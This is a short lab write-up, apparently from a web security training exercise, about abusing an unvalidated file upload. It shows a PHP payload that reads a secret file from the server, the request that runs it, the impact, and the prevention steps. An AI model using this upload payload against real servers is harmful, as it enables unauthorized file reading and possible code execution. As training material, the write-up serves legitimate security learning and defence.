🧪 Lab: Unrestricted File Upload → File Read

🎯 Goal



Exploit file upload to read sensitive server files.



🪜 Steps

Found file upload feature (no proper validation).

Uploaded a PHP file: exploit.php



Payload used:



<?php echo file\_get\_contents('/home/carlos/secret'); ?>

File uploaded successfully.



Accessed the file:



GET /file/avatar/exploit.php

Server executed the script and returned the secret.

💥 Impact

Server-side file read

Potential Remote Code Execution (RCE)

Sensitive data exposure

🛡️ Prevention

Allow only specific file types (whitelist)

Validate file content, not just extension

Rename uploaded files

Store outside web root

Disable script execution in upload folders

